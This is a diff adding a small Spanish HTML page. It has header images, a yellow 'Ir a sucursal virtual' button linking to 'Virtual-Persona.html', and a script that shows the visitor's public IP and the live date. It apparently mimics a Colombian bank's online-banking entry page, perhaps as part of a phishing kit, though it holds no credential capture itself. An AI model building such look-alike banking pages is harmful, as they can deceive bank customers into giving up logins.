@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body  style=" margin: 0%; background-color: #f9f9fa
+;"      > 
+    <img src="img/h11.png"   width="100%"   alt="">
+    <img src="img/h22.png"  width="100%">
+    <center>
+        <br> <br> <br>
+        <form action="Virtual-Persona.html">
+    <button  type="submit"  style="   width: 70%;  background-color: #fdda24 ; color: black;   padding: 2%; border:  none; border-radius: 30px;"   >  <strong>Ir a sucursal virtual</strong>   </button>
+</form>
+    <br><br><br>
+</center>
+<img src="img/footer2.png" width="100%" alt="">
+
+
+<div id="info-usuario" style="    background-color: #fbfbfb  ;text-align: center; color: #333; margin-top: 40px; font-family: Arial, sans-serif; font-size: 12px;">
+    Dirección IP: <span id="ip">Obteniendo...</span><br>
+    <span id="fecha-hora">Cargando fecha y hora...</span>
+</div>
+
+<script>
+  // Obtener la IP pública del usuario
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      document.getElementById('ip').textContent = data.ip;
+    })
+    .catch(() => {
+      document.getElementById('ip').textContent = 'No disponible';
+    });
+
+  // Función para mostrar la hora en tiempo real
+  function mostrarFechaHora() {
+    const ahora = new Date();
+    const opciones = { 
+      weekday: 'long', year: 'numeric', month: 'long', 
+      day: 'numeric', hour: 'numeric', minute: '2-digit', second: '2-digit',
+      hour12: true 
+    };
+
+    const fechaHoraFormateada = ahora.toLocaleString('es-CO', opciones);
+    document.getElementById('fecha-hora').textContent = fechaHoraFormateada;
+  }
+
+  // Mostrar la hora de inmediato
+  mostrarFechaHora();
+
+  // Actualizar cada segundo
+  setInterval(mostrarFechaHora, 1000);
+</script>
+</body> 
+</html>
